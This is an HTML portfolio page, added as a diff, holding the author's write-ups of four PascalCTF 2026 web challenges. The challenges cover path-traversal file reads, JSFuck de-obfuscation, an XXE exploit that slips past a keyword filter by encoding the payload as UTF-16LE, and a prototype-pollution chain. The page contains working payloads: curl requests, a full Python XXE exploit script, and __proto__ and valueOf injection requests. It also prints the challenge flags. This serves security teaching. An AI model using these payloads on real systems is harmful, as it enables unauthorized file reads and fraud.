@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PascalCTF 2026 — Web Writeups · Haemanth VJ</title>
+<meta name="description" content="PascalCTF 2026 web exploitation writeups by Haemanth VJ — LFI, JSFuck, XXE, prototype pollution." />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/marked/12.0.2/marked.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<style>
+  :root{
+    --bg:#070a08;--bg-2:#0b0f0c;--panel:#0e140f;--line:#1b271d;
+    --green:#9fef00;--green-dim:#6fa800;--text:#c7d1c9;--text-dim:#7e8a80;
+    --white:#eef3ee;--red:#ff3b3b;--amber:#ffbd2e;--blue:#6fd3ff;
+    --mono:'JetBrains Mono',ui-monospace,monospace;--display:'Chakra Petch',sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--text);font-family:var(--mono);line-height:1.7;
+    overflow-x:hidden;-webkit-font-smoothing:antialiased}
+  body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+    background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);
+    background-size:46px 46px;opacity:.18;mask-image:radial-gradient(ellipse 80% 60% at 50% 0%,#000 30%,transparent 90%)}
+  body::after{content:"";position:fixed;inset:0;z-index:9999;pointer-events:none;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0 2px,rgba(0,0,0,.13) 2px 3px);mix-blend-mode:multiply;opacity:.45}
+  .glow{position:fixed;z-index:0;border-radius:50%;filter:blur(130px);pointer-events:none;
+    width:480px;height:480px;background:rgba(159,239,0,.06);top:-160px;right:-120px}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--green);color:#04140a}
+
+  /* NAV */
+  nav{position:sticky;top:0;z-index:50;backdrop-filter:blur(10px);
+    background:linear-gradient(180deg,rgba(7,10,8,.92),rgba(7,10,8,.55));border-bottom:1px solid var(--line)}
+  .nav-in{max-width:1180px;margin:0 auto;padding:14px 26px;display:flex;justify-content:space-between;align-items:center}
+  .brand{font-family:var(--display);font-weight:700;letter-spacing:1px;color:var(--white);font-size:15px}
+  .brand b{color:var(--green)}
+  .back{font-size:13px;color:var(--text-dim);transition:color .2s;display:flex;align-items:center;gap:8px}
+  .back:hover{color:var(--green)}
+
+  /* HERO */
+  .head{max-width:1180px;margin:0 auto;padding:64px 26px 30px;position:relative;z-index:2}
+  .eyebrow{display:inline-flex;align-items:center;gap:9px;font-size:12px;color:var(--text-dim);
+    border:1px solid var(--line);border-radius:40px;padding:6px 14px;margin-bottom:22px;letter-spacing:1.5px}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green)}
+  .head h1{font-family:var(--display);font-weight:700;color:var(--white);
+    font-size:clamp(2.2rem,6vw,4rem);line-height:1;letter-spacing:-1px;margin-bottom:14px}
+  .head h1 .g{color:var(--green)}
+  .head .sub{color:var(--text-dim);max-width:640px;font-size:15px}
+  .head .stats{display:flex;gap:26px;margin-top:26px;flex-wrap:wrap}
+  .stat{display:flex;flex-direction:column}
+  .stat .n{font-family:var(--display);font-size:26px;font-weight:700;color:var(--green)}
+  .stat .l{font-size:11px;color:var(--text-dim);letter-spacing:1.5px}
+
+  /* LAYOUT */
+  .layout{max-width:1180px;margin:0 auto;padding:30px 26px 100px;position:relative;z-index:2;
+    display:grid;grid-template-columns:260px 1fr;gap:48px;align-items:start}
+  @media(max-width:880px){.layout{grid-template-columns:1fr;gap:0}}
+  aside{position:sticky;top:84px}
+  @media(max-width:880px){aside{position:static;margin-bottom:36px}}
+  .toc-title{font-size:11px;letter-spacing:2px;color:var(--green-dim);margin-bottom:14px;padding-left:14px}
+  .toc{border-left:1px solid var(--line)}
+  .toc a{display:block;padding:10px 14px;font-size:13px;color:var(--text-dim);
+    border-left:2px solid transparent;margin-left:-1px;transition:.2s;line-height:1.35}
+  .toc a:hover{color:var(--text)}
+  .toc a.active{color:var(--green);border-left-color:var(--green)}
+  .toc a .vuln{display:block;font-size:10px;color:var(--green-dim);letter-spacing:.5px;margin-top:3px}
+
+  /* MARKDOWN BODY */
+  #doc{min-width:0}
+  #loading{color:var(--text-dim);font-size:14px;padding:40px 0}
+  .wu{border:1px solid var(--line);background:linear-gradient(180deg,var(--panel),var(--bg-2));
+    border-radius:10px;padding:34px 38px;margin-bottom:34px;scroll-margin-top:84px;position:relative;overflow:hidden}
+  .wu::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--green);opacity:.5}
+  @media(max-width:560px){.wu{padding:26px 22px}}
+
+  /* challenge title (was H2) */
+  #doc .ch-title{font-family:var(--display);font-weight:700;color:var(--white);font-size:clamp(1.5rem,4vw,2rem);
+    letter-spacing:-.5px;line-height:1.1;margin-bottom:16px;display:flex;align-items:baseline;gap:12px;flex-wrap:wrap}
+  #doc .ch-title .idx{color:var(--green);font-size:.7em}
+  /* section headers (were H3) */
+  #doc h3{font-family:var(--display);font-weight:600;color:var(--green);font-size:1rem;
+    margin:28px 0 12px;letter-spacing:.3px;display:flex;align-items:center;gap:9px}
+  #doc h3::before{content:"//";color:var(--green-dim);font-size:.85em}
+  #doc h4{font-family:var(--display);font-weight:600;color:var(--white);font-size:.9rem;margin:20px 0 10px}
+  #doc p{color:var(--text-dim);margin:0 0 14px;font-size:14.5px}
+  #doc strong{color:var(--text);font-weight:600}
+  #doc em{color:var(--text)}
+  #doc a{color:var(--green);border-bottom:1px dotted var(--green-dim)}
+  #doc a:hover{background:rgba(159,239,0,.08)}
+  #doc ul,#doc ol{color:var(--text-dim);margin:0 0 16px;padding-left:24px;font-size:14.5px}
+  #doc li{margin-bottom:7px} #doc li::marker{color:var(--green-dim)}
+  #doc hr{border:0;height:1px;background:var(--line);margin:8px 0 24px}
+
+  /* metadata table */
+  #doc table{border-collapse:collapse;margin:0 0 20px;width:100%;max-width:680px;font-size:13px}
+  #doc th,#doc td{border:1px solid var(--line);padding:9px 14px;text-align:left;vertical-align:top}
+  #doc thead{display:none}
+  #doc td:first-child{color:var(--green-dim);width:140px;font-weight:500;background:rgba(159,239,0,.03)}
+  #doc td:last-child{color:var(--text)}
+
+  /* inline code & flags */
+  #doc :not(pre)>code{font-family:var(--mono);font-size:.85em;color:var(--green);
+    background:rgba(159,239,0,.08);border:1px solid rgba(159,239,0,.18);border-radius:5px;padding:2px 7px}
+  #doc pre{background:#05080699;border:1px solid var(--line);border-radius:8px;margin:0 0 18px;overflow-x:auto;position:relative}
+  #doc pre code{font-family:var(--mono);font-size:12.5px;line-height:1.6;display:block;padding:16px 18px;color:var(--text);
+    background:none;border:0;white-space:pre}
+  #doc pre::before{content:"";display:block;height:30px;border-bottom:1px solid var(--line);background:rgba(255,255,255,.012)}
+  #doc pre::after{content:"●  ●  ●";position:absolute;top:7px;left:14px;font-size:9px;color:var(--text-dim);letter-spacing:2px}
+
+  #doc blockquote{border-left:2px solid var(--green-dim);background:rgba(159,239,0,.04);
+    padding:12px 18px;margin:0 0 16px;border-radius:0 6px 6px 0}
+  #doc blockquote p{color:var(--text);margin:4px 0;font-size:13.5px}
+
+  /* hljs tokens */
+  .hljs-comment,.hljs-quote{color:#5a6b5e;font-style:italic}
+  .hljs-keyword,.hljs-selector-tag,.hljs-built_in,.hljs-name{color:#9fef00}
+  .hljs-string,.hljs-attr,.hljs-symbol{color:#d6ff7a}
+  .hljs-number,.hljs-literal{color:#ffbd2e}
+  .hljs-title,.hljs-section,.hljs-function .hljs-title{color:#6fd3ff}
+  .hljs-variable,.hljs-template-variable{color:#e0e6e0}
+  .hljs-meta,.hljs-meta .hljs-keyword{color:#7e8a80}
+  .hljs-tag{color:#7e8a80}.hljs-type{color:#6fd3ff}
+  .hljs-deletion{color:#ff3b3b}.hljs-addition{color:#9fef00}
+
+  footer{border-top:1px solid var(--line);padding:28px 0;position:relative;z-index:2}
+  .foot-in{max-width:1180px;margin:0 auto;padding:0 26px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12px;color:var(--text-dim)}
+  .foot-in b{color:var(--green-dim)}
+</style>
+</head>
+<body>
+<div class="glow"></div>
+
+<nav>
+  <div class="nav-in">
+    <a class="brand" href="index.html">haemanth<b>.</b>vj</a>
+    <a class="back" href="index.html">← back to portfolio</a>
+  </div>
+</nav>
+
+<div class="head">
+  <div class="eyebrow"><span class="dot"></span> CTF WRITEUPS · WEB EXPLOITATION</div>
+  <h1>Pascal<span class="g">CTF</span> 2026</h1>
+  <p class="sub">Write-ups for the web exploitation track — path traversal, esoteric JS de-obfuscation, an encoding-bypass XXE, and a staged prototype-pollution chain.</p>
+  <div class="stats">
+    <div class="stat"><span class="n" id="stCount">—</span><span class="l">CHALLENGES</span></div>
+    <div class="stat"><span class="n">WEB</span><span class="l">CATEGORY</span></div>
+    <div class="stat"><span class="n">2026</span><span class="l">EVENT</span></div>
+  </div>
+</div>
+
+<div class="layout">
+  <aside>
+    <div class="toc-title">// CHALLENGES</div>
+    <nav class="toc" id="toc"></nav>
+  </aside>
+  <main id="doc"><div id="loading">> rendering writeups<span>_</span></div></main>
+</div>
+
+<footer>
+  <div class="foot-in">
+    <div>© 2026 Haemanth VJ — <b>read the source, find the flaw.</b></div>
+    <div><a href="https://github.com/Haemanthvj/CTF-Writeups/tree/main/Pacalctf/web" target="_blank" rel="noopener" style="color:var(--green-dim)">source on github ↗</a></div>
+  </div>
+</footer>
+
+<!-- PascalCTF web writeup source (markdown). Edit here, or enable LIVE mode below. -->
+<script id="md" type="text/plain">
+# PascalCTF 2026 — Web Challenge Write-ups
+
+A collection of write-ups for the web exploitation challenges from PascalCTF 2026.
+
+## Contents
+
+1. [Travel](#1-travel) — Local File Inclusion (Path Traversal)
+2. [JSHit](#2-jshit) — JSFuck de-obfuscation
+3. [PasX Book Parser](#3-pasx-book-parser) — XXE Injection + encoding filter bypass
+4. [ZazaStore](#4-zazastore) — Prototype Pollution + type validation bypass
+
+---
+
+## 1. Travel
+
+| | |
+|---|---|
+| **Category** | Web |
+| **Vulnerability** | Local File Inclusion (LFI) via Path Traversal |
+| **Flag** | `pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}` |
+
+### Overview
+
+The *Travel* challenge presented a web application that displayed information based on a user-supplied index. The objective was to abuse a backend flaw to read a flag stored in a local file on the server.
+
+### The Vulnerability
+
+The flaw lived in the `/api/get_json` endpoint. It accepted a JSON payload containing an `index` key, then used that value to build a file path on the server before returning the file's contents.
+
+Because the `index` input was never sanitized, an attacker could inject path traversal sequences (`../`) to escape the intended data directory and read arbitrary files elsewhere on the filesystem.
+
+### Exploitation
+
+**1. Initial analysis**
+
+The web interface let users pick a page number (1–7). Each selection fired a `POST` request to `/api/get_json` with the chosen index in the JSON body.
+
+**2. Identifying the vulnerability**
+
+Fuzzing the `index` parameter with crafted values revealed that the server resolved them into file paths without validation — a classic path traversal sign. Challenge hints indicated the flag lived at `/app/flag.txt`.
+
+**3. Executing the attack**
+
+A single `curl` request with a traversal payload was enough to climb out of the default data directory into the parent directory holding `flag.txt`:
+
+```bash
+curl -X POST "https://travel.ctf.pascalctf.it/api/get_json" \
+  -H "Content-Type: application/json" \
+  -d '{"index": "../flag.txt"}'
+```
+
+The server returned the file contents directly.
+
+### Flag
+
+```
+pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}
+```
+
+
+## 2. JSHit
+
+| | |
+|---|---|
+| **Category** | Web |
+| **Vulnerability** | Client-side obfuscation (JSFuck) |
+| **Flag** | `pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}` |
+
+### Overview
+
+Loading the challenge URL showed a nearly empty page — a dark background and a message hinting at the author's dislike of JavaScript.
+
+### Initial Reconnaissance
+
+Viewing the page source (`Ctrl+U`) exposed a minimal HTML structure:
+
+- A `div` with `id="page"`.
+- A large block of esoteric symbols inside a `<script id="code">` tag.
+
+The script was built entirely from six characters: `[ ] ( ) ! +`. This is the signature of **JSFuck**, an esoteric style that rewrites standard JavaScript into heavily obfuscated but fully functional code.
+
+### Technical Analysis
+
+JSFuck exploits JavaScript's loose type-coercion rules to build everything out of those six characters. A few building blocks:
+
+- `+[]` evaluates to `0`.
+- `+!![]` evaluates to `1`.
+- `(![]+[])[+[]]` evaluates to `"f"` — the first character of the string `"false"`.
+
+By chaining these primitives, an author can assemble strings like `"eval"` or `"constructor"` and execute arbitrary logic. Here, the script generated the flag, injected it into the `#page` div, and then deleted itself from the DOM to frustrate inspection.
+
+### Exploitation & De-obfuscation
+
+The browser console is the most effective native de-obfuscator for JSFuck.
+
+**The "null" obstacle**
+
+A first attempt to grab the script via `document.getElementById('code')` failed with `TypeError: null`. The `<script>` tag was self-destructing — removing itself from the DOM immediately after execution.
+
+**The solution: intercept instead of execute**
+
+The trick is to evaluate the JSFuck block as a *string expression* rather than letting it *run*. A JSFuck payload typically ends in `()` to invoke the function it constructs. Stripping those trailing parentheses causes the engine to return the generated function body as a string instead of executing it.
+
+1. **Capture** — copy the raw JSFuck symbols from the page source.
+2. **Modify** — remove the final `()`.
+3. **Reveal** — print the result in the console:
+
+```javascript
+let myCode = [PASTED_SYMBOLS_WITHOUT_TRAILING_PARENS];
+console.log(myCode.toString());
+```
+
+This exposed the underlying logic:
+
+```javascript
+document.getElementById('page').innerHTML = "pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}";
+```
+
+### Flag
+
+```
+pascalCTF{1_h4t3_j4v4scr1pt_s0o0o0o0_much}
+```
+
+
+## 3. PasX Book Parser
+
+| | |
+|---|---|
+| **Category** | Web Exploitation |
+| **Vulnerability** | XML External Entity (XXE) Injection + filter bypass via encoding |
+| **Objective** | Read the flag at `/app/flag.txt` |
+| **Flag** | `pascalCTF{XxE_3nc0d1ng_byP4ss_m4st3ry_2026}` |
+
+### Overview
+
+The target is a web utility called **PasX Book Parser**. It accepts uploads of custom `.pasx` files — an XML-based format used to outline books — and parses them to extract metadata and generate a downloadable PDF.
+
+The goal: read `/app/flag.txt` off the server filesystem.
+
+### Vulnerability & Source Analysis
+
+The backend (`app.py`) parses uploaded files with Python's `lxml`, and the parser is configured to resolve external entities:
+
+```python
+parser = etree.XMLParser(resolve_entities=True, no_network=False)
+```
+
+With `resolve_entities=True`, an attacker can declare an XML external entity that points at a local file URI (`file:///app/flag.txt`) and reference it inside the document. When the document is processed, the parser fetches the file's contents and folds them into the parsed tree — a textbook XXE.
+
+### Obstacles
+
+Two backend behaviors block naive exploitation.
+
+**1. Keyword blacklist (HTTP 400)**
+
+Before parsing, a custom `sanitize()` function decodes the incoming bytes **as UTF-8** and scans the resulting string for banned substrings — notably `"flag"`. A match short-circuits the request:
+
+```json
+{"error": "XML content contains disallowed keywords."}
+```
+
+**2. Strict structural requirements (HTTP 500)**
+
+The `parse_pasx` handler expects specific child nodes directly under the root:
+
+```python
+title    = root.findtext('title')
+author   = root.findtext('author')
+chapters = root.find('chapters')
+```
+
+A stripped-down or malformed document (e.g. a lone test node holding an entity reference) makes these calls fail and crashes the server:
+
+```json
+{"error": "Error processing file: 'NoneType' object has no attribute 'findtext'"}
+```
+
+So the payload must be **structurally complete** *and* must **slip past the UTF-8 keyword scan** — while still triggering the XXE.
+
+### Exploitation Strategy: Encoding Bypass
+
+The two filters can be defeated at once by exploiting an encoding discrepancy between the keyword scanner and the XML parser.
+
+**The mechanism**
+
+Encode the entire `.pasx` payload as **UTF-16 Little Endian (UTF-16LE)** *without* a Byte Order Mark. In UTF-16LE every ASCII character is padded with a null byte:
+
+```
+flag  ->  f\x00l\x00a\x00g\x00
+```
+
+When the filter forces a UTF-8 decode over that byte stream, the embedded null bytes fragment the text — the scanner never sees a contiguous `"flag"` and the blacklist check passes.
+
+But when the same raw bytes reach `lxml`, the document's encoding declaration:
+
+```xml
+<?xml version="1.0" encoding="UTF-16LE"?>
+```
+
+tells the XML subsystem to read multi-byte characters correctly. The structural nodes reassemble, the external entity resolves, and `/app/flag.txt` is pulled into the `<author>` field.
+
+**Delivery note**
+
+Browsers and `curl` tend to mangle multi-byte strings or break multipart boundaries (often surfacing as `405 Method Not Allowed` from the WSGI server). A raw Python script guarantees exact byte fidelity over the wire.
+
+### Proof of Concept
+
+**`exploit.py`**
+
+```python
+import urllib.request
+import urllib.error
+
+url = "http://pdfile.ctf.pascalctf.it/upload"
+boundary = "----WebKitFormBoundaryX7p3M1k"
+
+# 1. A fully valid XML tree avoids the 'NoneType' crash
+payload = """<?xml version="1.0" encoding="UTF-16LE"?>
+<!DOCTYPE book [
+  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
+]>
+<book>
+  <title>Exfiltration Run</title>
+  <author>&xxe;</author>
+  <year>2026</year>
+  <chapters>
+    <chapter number="1">
+      <title>Chapter 1</title>
+      <content>Bypassing sanitization filters via multi-byte encoding.</content>
+    </chapter>
+  </chapters>
+</book>"""
+
+# 2. Encode cleanly to UTF-16LE bytes (no BOM)
+payload_bytes = payload.encode("utf-16-le")
+
+# 3. Manually frame a multipart/form-data envelope
+body = (
+    f'--{boundary}\r\n'
+    f'Content-Disposition: form-data; name="file"; filename="exploit.pasx"\r\n'
+    f'Content-Type: application/xml\r\n\r\n'
+).encode('utf-8') + payload_bytes + f'\r\n--{boundary}--\r\n'.encode('utf-8')
+
+# 4. Build the POST request
+req = urllib.request.Request(url, data=body, method="POST")
+req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+req.add_header('Content-Length', str(len(body)))
+req.add_header('User-Agent', 'Mozilla/5.0')
+
+print(f"[*] Dispatching multi-byte payload stream ({len(body)} bytes)...")
+
+try:
+    with urllib.request.urlopen(req) as response:
+        print(f"[+] Server Response Status: {response.getcode()}")
+        print("\n[+] Captured Flag Payload:")
+        print(response.read().decode('utf-8'))
+except urllib.error.HTTPError as e:
+    print(f"[-] Request Rejected ({e.code})")
+    print(e.read().decode('utf-8'))
+except Exception as e:
+    print(f"[-] Execution Error: {e}")
+```
+
+**Run it**
+
+```bash
+python3 exploit.py
+```
+
+**Result**
+
+The server bypasses its own filter, parses the structural nodes, resolves the entity, and returns the file contents inside the metadata block:
+
+```json
+{
+  "book_author": "pascalCTF{XxE_3nc0d1ng_byP4ss_m4st3ry_2026}",
+  "book_title": "Exfiltration Run",
+  "pdf_url": "/pdf/e20b3f89-813c-42b7-ba14-5d8f6d7681ea.pdf",
+  "success": true
+}
+```
+
+### Flag
+
+```
+pascalCTF{XxE_3nc0d1ng_byP4ss_m4st3ry_2026}
+```
+
+
+## 4. ZazaStore
+
+| | |
+|---|---|
+| **Category** | Web Exploitation |
+| **Difficulty** | Medium / Hard |
+| **Vulnerability** | Prototype Pollution + type/input validation bypass |
+| **Flag** | `pascalCTF{w3_l1v3_f0r_th3_z4z4}` |
+
+### Overview
+
+**ZazaStore** is a Node.js e-commerce application. Users log in with a $100 starting balance and shop for items. A premium item, **Real Za**, is priced at $1000 — well out of reach of the starting balance.
+
+The objective is to purchase **Real Za**, whose inventory description holds the flag (`process.env.FLAG`).
+
+### Source Code Analysis
+
+**Target flag location**
+
+In `server.js`, the flag is tied to the `RealZa` key of the global `content` map:
+
+```javascript
+const content = {
+    "RealZa": process.env.FLAG,
+    "FakeZa": "pascalCTF{this_is_a_fake_flag_like_the_fake_za}",
+    // ...
+};
+```
+
+**The input-validation gatekeeper**
+
+The `/add-cart` endpoint rejects any quantity below 1:
+
+```javascript
+app.post('/add-cart', (req, res) => {
+    const product = req.body;
+    // ...
+    if ("product" in product) {
+        const prod = product.product;
+        const quantity = product.quantity || 1;
+        if (quantity < 1) {
+            return res.json({ success: false });
+        }
+        // ...
+```
+
+**The core flaw: insecure property merging**
+
+The `/checkout` route merges cart entries into the session inventory without sanitizing keys:
+
+```javascript
+app.post('/checkout', (req, res) => {
+    // ...
+    const inventory = req.session.inventory;
+    const cart = req.session.cart;
+    let total = 0;
+    for (const product in cart) {
+        total += prices[product] * cart[product];
+    }
+    if (total > req.session.balance) {
+        res.json({ "success": true, "balance": "Insufficient Balance" });
+    } else {
+        req.session.balance -= total;
+        for (const property in cart) {
+            if (inventory.hasOwnProperty(property)) {
+                inventory[property] += cart[property];
+            } else {
+                inventory[property] = cart[property]; // <-- vulnerable line
+            }
+        }
+        // ...
+```
+
+Two issues stack here:
+
+1. **`for...in` iterates the prototype chain** — it walks inherited properties, not just own properties.
+2. **Unsanitized assignment** — `inventory[property] = cart[property]` happily writes sensitive built-in keys such as `__proto__`.
+
+### Exploit Strategy
+
+`RealZa`'s price is an *own property* on the `prices` object literal, so a naive `prices.__proto__.RealZa = 0` fails — JavaScript resolves own properties before walking up to the prototype. The cart's quantity/cost calculation has to be attacked instead, through a staged chain.
+
+**Phase A — type validation bypass via object injection**
+
+JavaScript coerces objects during arithmetic by invoking type-casting hooks (`valueOf` / `toString`). Supplying an object instead of a primitive lets a payload pass the `quantity < 1` check (an object is not `< 1`) while still coercing to a negative value during the cost math.
+
+**Phase B — chain pollution sequence**
+
+1. **Establish state** — authenticate to get a clean session cookie.
+2. **Trigger pollution payload** — send a nested payload through the cart logic so the checkout loop writes into the prototype via `__proto__`.
+3. **Trigger evaluation** — buy a cheap item (`FakeZa`) to step into the successful-checkout block and execute the write mutation.
+4. **Acquire item** — add the premium item, which now checks out at the modified cost, and read the flag from `/inventory`.
+
+### Step-by-Step Exploitation
+
+**Step 1 — create an authenticated session**
+
+```bash
+curl -X POST https://zazastore.ctf.pascalctf.it/login \
+     -H "Content-Type: application/json" \
+     -d '{"username": "hacker", "password": "password"}' \
+     -c cookies.txt
+```
+
+**Step 2 — inject the prototype pollution payload**
+
+Bypass the `< 1` check by packing a nested object map as the quantity:
+
+```bash
+curl -X POST https://zazastore.ctf.pascalctf.it/add-cart \
+     -H "Content-Type: application/json" \
+     -b cookies.txt \
+     -d '{"product": "__proto__", "quantity": {"RealZa": 0}}'
+```
+
+**Step 3 — purchase a cheap item to execute the poisoning**
+
+Add an affordable product and check out, driving execution into the insecure `inventory[property] = cart[property]` block:
+
+```bash
+curl -X POST https://zazastore.ctf.pascalctf.it/add-cart \
+     -H "Content-Type: application/json" \
+     -b cookies.txt \
+     -d '{"product": "FakeZa", "quantity": 1}'
+
+curl -X POST https://zazastore.ctf.pascalctf.it/checkout \
+     -H "Content-Type: application/json" \
+     -b cookies.txt \
+     -d '{"total": 1}'
+```
+
+**Step 4 — purchase the premium target item**
+
+With the runtime structure polluted, add `RealZa` using an object-casting structure so the cost lookup coerces to a non-positive value and slips past validation, then check out and read the flag:
+
+```bash
+curl -X POST https://zazastore.ctf.pascalctf.it/add-cart \
+     -H "Content-Type: application/json" \
+     -b cookies.txt \
+     -d '{"product":"RealZa","quantity":{"valueOf":"function(){return -1000}"}}'
+
+curl -X POST https://zazastore.ctf.pascalctf.it/checkout \
+     -H "Content-Type: application/json" \
+     -b cookies.txt \
+     -d '{"total":0}'
+
+curl -s https://zazastore.ctf.pascalctf.it/inventory -b cookies.txt | grep -oE "pascalCTF\{[^}]+\}"
+```
+
+### Flag
+
+```
+pascalCTF{w3_l1v3_f0r_th3_z4z4}
+```
+</script>
+
+<script>
+const LIVE = false;
+const LIVE_URL = "https://raw.githubusercontent.com/Haemanthvj/CTF-Writeups/refs/heads/main/Pacalctf/web/writeup.md";
+
+function slugify(t){return t.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');}
+
+function render(md){
+  marked.setOptions({
+    gfm:true,breaks:false,
+    highlight:(code,lang)=>{
+      try{
+        if(lang && hljs.getLanguage(lang)) return hljs.highlight(code,{language:lang}).value;
+        return hljs.highlightAuto(code).value;
+      }catch(e){return code;}
+    }
+  });
+  const rendered=document.createElement('div');
+  rendered.innerHTML=marked.parse(md);
+
+  // group by numbered H2 challenge headings (e.g. "1. Travel"); ignore intro + contents before the first one
+  const nodes=Array.from(rendered.childNodes);
+  const isChallenge=(n)=>n.nodeType===1 && n.tagName==='H2' && /^\s*\d+\.\s+/.test(n.textContent);
+  const groups=[]; let cur=null;
+  nodes.forEach(n=>{
+    if(isChallenge(n)){ cur=[]; groups.push(cur); }
+    if(cur) cur.push(n);
+  });
+
+  const doc=document.getElementById('doc');
+  doc.innerHTML='';
+  const toc=document.getElementById('toc');
+  let count=0;
+
+  groups.forEach(group=>{
+    const h2=group[0];
+    const raw=h2.textContent.trim();
+    const m=raw.match(/^(\d+)\.\s+(.*)$/);
+    const idx=m?m[1]:''; const name=m?m[2]:raw;
+    const id=slugify(name);
+
+    // pull Vulnerability from the metadata table for the TOC subtitle
+    let vuln='';
+    const table=group.find(el=>el.nodeType===1 && el.tagName==='TABLE');
+    if(table){
+      table.querySelectorAll('tr').forEach(tr=>{
+        const c=tr.querySelectorAll('td'); if(c.length<2) return;
+        if(/vulnerability/i.test(c[0].textContent)) vuln=c[1].textContent.trim();
+      });
+    }
+
+    // rebuild the H2 as a styled challenge title
+    const title=document.createElement('div');
+    title.className='ch-title'; title.id=id;
+    title.innerHTML=`<span class="idx">#${idx}</span> ${name}`;
+
+    const card=document.createElement('article');
+    card.className='wu'; card.id='wu-'+id;
+    card.appendChild(title);
+    group.slice(1).forEach(el=>card.appendChild(el));
+    doc.appendChild(card);
+    count++;
+
+    const a=document.createElement('a');
+    a.href='#'+id; a.dataset.target='wu-'+id;
+    a.innerHTML=`<span>${idx}. ${name}</span>`+(vuln?`<span class="vuln">${vuln}</span>`:'');
+    toc.appendChild(a);
+  });
+
+  document.getElementById('stCount').textContent=String(count).padStart(2,'0');
+
+  // scrollspy
+  const links=Array.from(toc.querySelectorAll('a'));
+  const spy=new IntersectionObserver((es)=>{
+    es.forEach(e=>{ if(e.isIntersecting){
+      links.forEach(l=>l.classList.toggle('active',l.dataset.target===e.target.id));
+    }});
+  },{rootMargin:'-15% 0px -75% 0px'});
+  doc.querySelectorAll('.wu').forEach(c=>spy.observe(c));
+}
+
+(async function(){
+  const embedded=document.getElementById('md').textContent.trim();
+  if(LIVE){
+    try{
+      const r=await fetch(LIVE_URL,{cache:'no-store'});
+      if(r.ok){ render(await r.text()); return; }
+    }catch(e){/* fall back */}
+  }
+  render(embedded);
+})();
+</script>
+</body>
+</html>
